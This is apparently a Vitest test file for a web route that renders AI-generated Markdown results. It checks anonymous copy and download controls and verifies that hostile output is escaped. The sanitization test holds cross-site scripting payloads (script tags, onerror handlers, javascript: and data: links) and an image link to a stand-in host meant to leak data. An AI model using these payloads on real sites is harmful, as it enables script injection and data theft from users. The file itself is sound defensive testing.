import { describe, expect, it, vi } from "vitest";

const getResultMock = vi.fn();
vi.mock("@/lib/results", () => ({ getResult: (...args: unknown[]) => getResultMock(...args) }));
const markdown = "---\nproduct: Example\n---\n# DEVREL.md\n\nA draft.\n";
getResultMock.mockResolvedValue({ id: "example", markdown, gates: [] });

import { GET } from "@/app/r/[id]/route";

function request(path: string): Request {
  return new Request(`https://devrel.md${path}`, { headers: { accept: "text/html", "user-agent": "Mozilla/5.0" } });
}

describe("anonymous result", () => {
  it("shows the raw file, copy and download controls before signup", async () => {
    const response = await GET(request("/r/example"), { params: Promise.resolve({ id: "example" }) });
    const html = await response.text();
    expect(html).toContain('id="raw-markdown"');
    expect(html).toContain('id="copy-markdown"');
    expect(html).toContain('href="/r/example.md?download=1"');
    expect(html).toContain('action="/api/community"');
    // Turnstile widget, and a visible message when JavaScript is off.
    expect(html).toContain('class="cf-turnstile');
    expect(html).toContain("https://challenges.cloudflare.com/turnstile/v0/api.js");
    expect(html).toContain("<noscript>");
    expect(html).toContain("confirm");
    expect(html).not.toContain("Unlock copy and download");
  });

  it("downloads the complete Markdown without a cookie or JavaScript", async () => {
    const response = await GET(request("/r/example.md?download=1"), { params: Promise.resolve({ id: "example.md" }) });
    expect(response.status).toBe(200);
    expect(response.headers.get("content-disposition")).toContain('filename="DEVREL.md"');
    expect(await response.text()).toBe(markdown);
  });
});

describe("hostile model output on /r/[id]", () => {
  it("renders no script, event handler, script URL or remote image", async () => {
    const hostile = [
      '---',
      'product: "</title><script>alert(1)</script>"',
      'owner: "<img src=x onerror=alert(1)>"',
      '---',
      '# DEVREL.md',
      '',
      '<script>alert(1)</script>',
      '',
      '[click](javascript:alert(1)) [data](data:text/html,<script>alert(1)</script>)',
      '',
      '![x](https://evil.example/leak?d=1)',
      '',
      '<img src=x onerror=alert(1)>',
      '',
    ].join("\n");
    getResultMock.mockResolvedValueOnce({
      id: "hostile",
      markdown: hostile,
      gates: [{ stage: "<b>Awareness</b>", gate: "<script>1</script>", now: '"><img src=x onerror=1>', pass: "unknown" }],
    });
    const response = await GET(request("/r/hostile"), { params: Promise.resolve({ id: "hostile" }) });
    const html = await response.text();

    // Strip the three scripts the site itself ships (theme, toggle and the copy button) and look at the rest.
    // The one external script is Cloudflare Turnstile's, for the community form.
    const withoutOwnScripts = html
      .replace(/<script>[\s\S]*?<\/script>/g, "")
      .replace(/<script src="https:\/\/challenges\.cloudflare\.com\/turnstile\/v0\/api\.js" async defer><\/script>/, "");
    expect(withoutOwnScripts).not.toMatch(/<script/i);
    expect(html.match(/<script>/g)?.length).toBe(3);
    // Only real tags matter: the raw Markdown view legitimately shows the source as escaped text.
    expect(html).not.toMatch(/<img/i);
    expect(html).not.toMatch(/<[a-z][^>]*\son[a-z]+\s*=/i);
    expect(html).not.toMatch(/href="(javascript|data):/i);
    // The raw view may mention the host as escaped text, but no attribute may carry it.
    expect(html).not.toMatch(/(src|href)="[^"]*evil\.example/);
    // The raw Markdown view shows the source as inert text.
    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
  });
});
